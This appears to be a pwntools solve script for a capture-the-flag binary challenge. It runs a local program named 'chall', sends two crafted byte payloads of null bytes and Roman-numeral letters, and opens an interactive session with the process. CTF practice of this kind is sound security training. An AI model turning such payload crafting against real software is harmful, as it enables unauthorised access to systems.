#!/usr/bin/python3
from audioop import reverse
import pwn

pwn.context.terminal = ['tmux', 'splitw', '-h']

elf = pwn.ELF("./chall")
if pwn.args.GDB:
    io = pwn.gdb.debug(elf.path)
else:
    io = elf.process()

payload1 = b'\0' * 6 + b'M' * 5 + b'C' * 1 + b'X' * 4 + b'I' * 8
payload2 = b'I' * 8 + b'\0' * 6
io.sendline(payload1)
io.sendline(payload2)
io.interactive()
